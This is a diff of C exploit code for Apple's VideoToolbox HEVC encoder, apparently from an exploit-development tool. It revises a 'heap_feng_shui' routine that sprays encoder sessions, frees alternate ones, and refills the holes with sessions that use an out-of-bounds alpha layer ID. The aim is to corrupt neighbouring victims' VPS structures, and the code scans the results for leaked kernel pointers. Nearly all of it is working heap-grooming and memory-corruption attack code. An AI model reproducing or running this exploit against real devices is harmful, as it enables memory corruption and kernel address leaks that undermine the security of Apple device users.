@@ -7322,19 +7322,16 @@ vps_cd_done:
         /*
          * heap_feng_shui — Cross-session VPS corruption via OOB write
          *
-         * Key insight: each VTCompressionSession gets its own sHEVC_VPS
-         * allocation in the same kalloc zone. By spraying sessions then
-         * punching holes, we can place an attacker session adjacent to
-         * a victim session. The attacker's OOB write (high AlphaLayerID)
-         * corrupts the victim's sHEVC_VPS struct. Re-encoding with the
-         * victim reveals corruption in its VPS bytes.
+         * Uses the CONFIRMED OOB path: EncodesAlpha + RequiredHEVCVideoParameterSetAlphaLayerID
+         * Both victims (AID=1, in-bounds) and attackers (AID=high, OOB) use this path
+         * so they allocate sHEVC_VPS in the same kalloc bucket.
          *
-         * This defeats the limitation where OOB indices (AID>=63) don't
-         * produce VPS format descriptions from the SAME session — instead
-         * we read the VICTIM session's VPS which uses AID=0 (always works).
+         * Memory layout after spray+punch+fill:
+         *   [A0][V1][A1][V3][A2][V5]...
+         * A0's OOB write extends forward, potentially into V1's allocation.
          */
-        int spray_count = (argc > 2) ? atoi(argv[2]) : 24;
-        int oob_aid = (argc > 3) ? atoi(argv[3]) : 128;
+        int spray_count = (argc > 2) ? atoi(argv[2]) : 32;
+        int oob_aid = (argc > 3) ? atoi(argv[3]) : 255;
         if (spray_count < 8) spray_count = 8;
         if (spray_count > 64) spray_count = 64;
         if (oob_aid < 64) oob_aid = 64;
@@ -7342,9 +7339,9 @@ vps_cd_done:
 
         int vw = 192, vh = 192;
         rlog("=== HEAP_FENG_SHUI: Cross-session VPS corruption ===\n");
-        rlog("Spray: %d sessions, Attacker AID=%d, res=%dx%d\n\n", spray_count, oob_aid, vw, vh);
+        rlog("Spray: %d sessions, Attacker AID=%d, Victim AID=1, res=%dx%d\n\n",
+             spray_count, oob_aid, vw, vh);
 
-        /* Arrays to hold sessions and their baseline VPS bytes */
         VTCompressionSessionRef *sessions = calloc(spray_count, sizeof(VTCompressionSessionRef));
         uint8_t (*baseline_vps)[256] = calloc(spray_count, 256);
         size_t *baseline_lens = calloc(spray_count, sizeof(size_t));
@@ -7352,18 +7349,56 @@ vps_cd_done:
             rlog("FAIL: calloc\n"); goto done;
         }
 
-        /* Phase 1: Create spray sessions with AID=0 and get baseline VPS */
-        rlog("--- Phase 1: Spray %d encoder sessions (AID=0) ---\n", spray_count);
+        /* Helper: create EncodesAlpha session with given AID */
+        #define CREATE_ALPHA_SESSION(w_, h_, aid_val, out_s) do { \
+            VTCompressionSessionRef s_ = NULL; \
+            CFMutableDictionaryRef es_ = CFDictionaryCreateMutable(NULL, 0, \
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks); \
+            CFDictionarySetValue(es_, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue); \
+            CFDictionarySetValue(es_, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue); \
+            OSStatus cs_ = VTCompressionSessionCreate(NULL, w_, h_, \
+                kCMVideoCodecType_HEVC, es_, NULL, NULL, encode_cb, NULL, &s_); \
+            CFRelease(es_); \
+            if (cs_ == noErr && s_) { \
+                VTSessionSetProperty(s_, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue); \
+                VTSessionSetProperty(s_, CFSTR("EncodesAlpha"), kCFBooleanTrue); \
+                int av_ = (aid_val); \
+                CFNumberRef an_ = CFNumberCreate(NULL, kCFNumberIntType, &av_); \
+                VTSessionSetProperty(s_, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), an_); \
+                CFRelease(an_); \
+                cs_ = VTCompressionSessionPrepareToEncodeFrames(s_); \
+                if (cs_ != noErr) { VTCompressionSessionInvalidate(s_); CFRelease(s_); s_ = NULL; } \
+            } else { s_ = NULL; } \
+            (out_s) = s_; \
+        } while(0)
+
+        /* Phase 0: Warmup — allocate and free sessions to fill kalloc slab */
+        rlog("--- Phase 0: Warmup (prime kalloc slab) ---\n");
+        {
+            VTCompressionSessionRef warmup[16];
+            int nw = 0;
+            for (int i = 0; i < 16; i++) {
+                CREATE_ALPHA_SESSION(vw, vh, 1, warmup[i]);
+                if (warmup[i]) nw++;
+            }
+            for (int i = 0; i < 16; i++)
+                if (warmup[i]) { VTCompressionSessionInvalidate(warmup[i]); CFRelease(warmup[i]); }
+            rlog("Warmed up %d sessions\n\n", nw);
+            usleep(50000);
+        }
+
+        /* Phase 1: Create spray sessions with AID=1 (in-bounds, produces valid VPS) */
+        rlog("--- Phase 1: Spray %d encoder sessions (AID=1) ---\n", spray_count);
         int created = 0;
         for (int i = 0; i < spray_count; i++) {
-            rlog("  S[%d]: ", i);
-            sessions[i] = create_mvhevc_encoder(vw, vh, 0);
+            rlog("  S[%2d]: ", i);
+            CREATE_ALPHA_SESSION(vw, vh, 1, sessions[i]);
             if (!sessions[i]) { rlog("FAIL\n"); continue; }
             created++;
 
-            /* Encode one frame to get VPS bytes */
             g_encode_done = 0; g_cb_status = -999;
-            g_cb_had_fmt = 0; g_saved_fmt = NULL;
+            g_cb_had_fmt = 0;
+            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
             CVPixelBufferRef pb = create_pb(vw, vh);
             if (pb) {
                 CMTime pts = CMTimeMake(i, 30);
@@ -7371,25 +7406,23 @@ vps_cd_done:
                 for (int ww = 0; ww < 200 && !g_encode_done; ww++) usleep(10000);
                 CVPixelBufferRelease(pb);
             }
-
-            /* Save baseline VPS (pset[0]) */
             if (g_saved_fmt) {
                 const uint8_t *ptr = NULL;
                 size_t sz = 0;
-                OSStatus st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                     g_saved_fmt, 0, &ptr, &sz, NULL, NULL);
-                if (st == 0 && ptr && sz > 0 && sz <= 256) {
+                if (ptr && sz > 0 && sz <= 256) {
                     memcpy(baseline_vps[i], ptr, sz);
                     baseline_lens[i] = sz;
                 }
                 CFRelease(g_saved_fmt); g_saved_fmt = NULL;
             }
-            rlog("OK enc=%d vps=%zu bytes\n", (int)g_cb_status, baseline_lens[i]);
+            rlog("enc=%d vps=%zu bytes\n", (int)g_cb_status, baseline_lens[i]);
         }
-        rlog("Created: %d / %d sessions\n\n", created, spray_count);
+        rlog("Created: %d / %d\n\n", created, spray_count);
 
-        /* Phase 2: Destroy alternate sessions to create holes */
-        rlog("--- Phase 2: Punch holes (destroy even-indexed sessions) ---\n");
+        /* Phase 2: Destroy even-indexed sessions to create holes */
+        rlog("--- Phase 2: Punch holes (destroy even-indexed) ---\n");
         int freed = 0;
         for (int i = 0; i < spray_count; i += 2) {
             if (sessions[i]) {
@@ -7400,77 +7433,32 @@ vps_cd_done:
                 freed++;
             }
         }
-        rlog("Freed %d sessions (holes created)\n\n", freed);
-        usleep(100000); /* 100ms for allocator to consolidate */
+        rlog("Freed %d sessions\n", freed);
+        usleep(200000); /* 200ms for allocator */
 
-        /* Phase 3: Create attacker sessions in the holes */
-        rlog("--- Phase 3: Create attacker sessions (AID=%d) in holes ---\n", oob_aid);
+        /* Phase 3: Fill holes with attacker sessions (high AID = OOB write) */
+        rlog("\n--- Phase 3: Create %d attacker sessions (AID=%d) ---\n", freed, oob_aid);
         VTCompressionSessionRef *attackers = calloc(freed, sizeof(VTCompressionSessionRef));
         int attack_count = 0;
-        for (int t = 0; t < freed && t < 32; t++) {
-            rlog("  Attacker[%d]: ", t);
-
-            VTCompressionSessionRef s = NULL;
-            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            CFDictionarySetValue(enc_spec,
-                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
-            OSStatus st = VTCompressionSessionCreate(NULL, vw, vh,
-                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
-                encode_cb, NULL, &s);
-            CFRelease(enc_spec);
-            if (st != noErr || !s) { rlog("create fail\n"); continue; }
-
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
-            int kf = 1;
-            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
-            CFRelease(kfn);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
-
-            int base = 0;
-            CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &base);
-            CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &oob_aid);
-            CFArrayRef layer_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_arr);
-            CFRelease(layer_arr);
-            CFArrayRef view_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCViewIDs, view_arr);
-            CFRelease(view_arr);
-            CFArrayRef lr_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, lr_arr);
-            CFRelease(lr_arr);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
-            uint32_t bl = 64000;
-            CFNumberRef bln = CFNumberCreate(NULL, kCFNumberSInt32Type, &bl);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_StereoCameraBaseline, bln);
-            CFRelease(bln);
-            VTSessionSetProperty(s, kVTCompressionPropertyKey_ProfileLevel,
-                kVTProfileLevel_HEVC_Main10_AutoLevel);
-            CFRelease(n0); CFRelease(n1);
-
-            /* PrepareToEncodeFrames triggers sAddClient → OOB write */
-            st = VTCompressionSessionPrepareToEncodeFrames(s);
-            rlog("prepare=%d (OOB write happened)\n", (int)st);
-            if (st == noErr) {
-                attackers[attack_count++] = s;
+        for (int t = 0; t < freed; t++) {
+            rlog("  A[%2d]: ", t);
+            CREATE_ALPHA_SESSION(vw, vh, oob_aid, attackers[t]);
+            if (attackers[t]) {
+                attack_count++;
+                rlog("OK (OOB write at AID=%d)\n", oob_aid);
             } else {
-                VTCompressionSessionInvalidate(s);
-                CFRelease(s);
+                rlog("FAIL\n");
             }
         }
-        rlog("Attackers created: %d\n\n", attack_count);
+        rlog("Attackers: %d / %d\n\n", attack_count, freed);
 
-        /* Phase 4: Re-encode with all surviving victim sessions and compare VPS */
-        rlog("--- Phase 4: Re-encode victims, check for VPS corruption ---\n");
-        int checked = 0, corrupted = 0;
-        for (int i = 0; i < spray_count; i++) {
+        /* Phase 4: Re-encode ALL surviving victims and compare VPS */
+        rlog("--- Phase 4: Re-encode victims, check VPS corruption ---\n");
+        int checked = 0, corrupted = 0, lost_fmt_count = 0;
+        for (int i = 1; i < spray_count; i += 2) {
             if (!sessions[i] || baseline_lens[i] == 0) continue;
             checked++;
 
-            /* Re-encode to get fresh VPS bytes */
             g_encode_done = 0; g_cb_status = -999;
             g_cb_had_fmt = 0;
             if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
@@ -7482,95 +7470,75 @@ vps_cd_done:
                 CVPixelBufferRelease(pb);
             }
 
-            /* Compare VPS bytes against baseline */
-            if (g_saved_fmt) {
-                const uint8_t *ptr = NULL;
-                size_t sz = 0;
-                OSStatus st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
-                    g_saved_fmt, 0, &ptr, &sz, NULL, NULL);
-                if (st == 0 && ptr && sz > 0) {
-                    int diffs = 0;
-                    if (sz != baseline_lens[i]) {
-                        diffs = -1; /* length changed */
-                    } else {
-                        for (size_t j = 0; j < sz; j++) {
-                            if (ptr[j] != baseline_vps[i][j]) diffs++;
+            if (!g_saved_fmt) {
+                lost_fmt_count++;
+                rlog("  V[%2d]: *** LOST FORMAT DESC (fmt=NULL after attacker OOB!) ***\n", i);
+                continue;
+            }
+
+            const uint8_t *ptr = NULL;
+            size_t sz = 0;
+            OSStatus st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                g_saved_fmt, 0, &ptr, &sz, NULL, NULL);
+
+            if (st != 0 || !ptr || sz == 0) {
+                lost_fmt_count++;
+                rlog("  V[%2d]: no VPS pset (st=%d)\n", i, (int)st);
+            } else {
+                int diffs = 0;
+                if (sz != baseline_lens[i]) {
+                    diffs = -1;
+                } else {
+                    for (size_t j = 0; j < sz; j++)
+                        if (ptr[j] != baseline_vps[i][j]) diffs++;
+                }
+                if (diffs != 0) {
+                    corrupted++;
+                    rlog("  *** CORRUPTED V[%2d]: ", i);
+                    if (diffs == -1) rlog("LEN %zu->%zu\n", baseline_lens[i], sz);
+                    else rlog("%d byte diffs\n", diffs);
+                    rlog("    base: ");
+                    for (size_t j = 0; j < baseline_lens[i] && j < 64; j++)
+                        rlog("%02x", baseline_vps[i][j]);
+                    rlog("\n    now:  ");
+                    for (size_t j = 0; j < sz && j < 64; j++)
+                        rlog("%02x", ptr[j]);
+                    rlog("\n    at:   ");
+                    size_t cl = (sz < baseline_lens[i]) ? sz : baseline_lens[i];
+                    for (size_t j = 0; j < cl; j++)
+                        if (ptr[j] != baseline_vps[i][j])
+                            rlog("[%zu]%02x>%02x ", j, baseline_vps[i][j], ptr[j]);
+                    rlog("\n");
+                    if (sz >= 8) {
+                        for (size_t j = 0; j <= sz - 8; j += 4) {
+                            uint64_t qw; memcpy(&qw, ptr + j, 8);
+                            if ((qw >> 40) == 0xfffffe || (qw >> 40) == 0xffff80)
+                                rlog("    *** KPTR@%zu: 0x%016llx ***\n", j, (unsigned long long)qw);
                         }
-                    }
-                    if (diffs != 0) {
-                        corrupted++;
-                        rlog("  *** CORRUPTED S[%d]: ", i);
-                        if (diffs == -1) {
-                            rlog("LEN changed: %zu -> %zu\n", baseline_lens[i], sz);
-                        } else {
-                            rlog("%d byte diffs\n", diffs);
-                        }
-                        rlog("    baseline: ");
-                        for (size_t j = 0; j < baseline_lens[i] && j < 64; j++)
-                            rlog("%02x", baseline_vps[i][j]);
-                        rlog("\n    current:  ");
-                        for (size_t j = 0; j < sz && j < 64; j++)
-                            rlog("%02x", ptr[j]);
-                        rlog("\n    diffs at: ");
-                        size_t cmplen = (sz < baseline_lens[i]) ? sz : baseline_lens[i];
-                        for (size_t j = 0; j < cmplen; j++) {
-                            if (ptr[j] != baseline_vps[i][j])
-                                rlog("[%zu]=%02x>%02x ", j, baseline_vps[i][j], ptr[j]);
-                        }
-                        rlog("\n");
-                        /* Scan for kernel pointers in changed bytes */
-                        if (sz >= 8) {
-                            for (size_t j = 0; j <= sz - 8; j += 4) {
-                                uint64_t qw;
-                                memcpy(&qw, ptr + j, 8);
-                                if ((qw >> 40) == 0xfffffe)
-                                    rlog("    *** KPTR@%zu: 0x%016llx ***\n", j, (unsigned long long)qw);
-                            }
-                        }
-                    } else {
-                        rlog("  S[%d]: VPS unchanged (%zu bytes) - OK\n", i, sz);
                     }
                 } else {
-                    rlog("  S[%d]: no VPS on re-encode (st=%d)\n", i, (int)st);
+                    rlog("  V[%2d]: unchanged (%zu bytes)\n", i, sz);
                 }
-                CFRelease(g_saved_fmt); g_saved_fmt = NULL;
-            } else {
-                rlog("  S[%d]: no fmt on re-encode\n", i);
             }
+            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
         }
-        rlog("\nResults: checked=%d, corrupted=%d\n", checked, corrupted);
+
+        rlog("\n=== RESULTS ===\n");
+        rlog("Victims checked: %d, corrupted: %d, lost_fmt: %d\n",
+             checked, corrupted, lost_fmt_count);
         if (corrupted > 0)
-            rlog("*** CROSS-SESSION VPS CORRUPTION DETECTED ***\n");
+            rlog("*** CROSS-SESSION VPS CORRUPTION CONFIRMED ***\n");
+        else if (lost_fmt_count > 0)
+            rlog("*** VICTIMS LOST FMT — possible cross-session damage ***\n");
         else
-            rlog("No cross-session corruption detected\n");
+            rlog("No cross-session corruption (OOB likely stays within struct)\n");
 
-        /* Also check: did any victim lose its format description entirely? */
-        rlog("\n--- Phase 5: Check for session crashes/hangs ---\n");
-        int lost_fmt = 0;
-        for (int i = 0; i < spray_count; i++) {
-            if (!sessions[i]) continue;
-            /* Try a third encode */
-            g_encode_done = 0; g_cb_status = -999; g_cb_had_fmt = 0;
-            CVPixelBufferRef pb = create_pb(vw, vh);
-            if (pb) {
-                CMTime pts = CMTimeMake(2000 + i, 30);
-                VTCompressionSessionEncodeFrame(sessions[i], pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
-                for (int ww = 0; ww < 200 && !g_encode_done; ww++) usleep(10000);
-                CVPixelBufferRelease(pb);
-            }
-            if (!g_cb_had_fmt) {
-                lost_fmt++;
-                rlog("  S[%d]: LOST format description on 3rd encode!\n", i);
-            }
-        }
-        rlog("Lost fmt: %d / %d survivors\n", lost_fmt, checked);
-
-        /* Cleanup */
         for (int i = 0; i < spray_count; i++)
             if (sessions[i]) { VTCompressionSessionInvalidate(sessions[i]); CFRelease(sessions[i]); }
-        for (int i = 0; i < attack_count; i++)
+        for (int i = 0; i < freed; i++)
             if (attackers[i]) { VTCompressionSessionInvalidate(attackers[i]); CFRelease(attackers[i]); }
         free(sessions); free(baseline_vps); free(baseline_lens); free(attackers);
+        #undef CREATE_ALPHA_SESSION
 
         rlog("\n=== HEAP_FENG_SHUI complete ===\n");
 
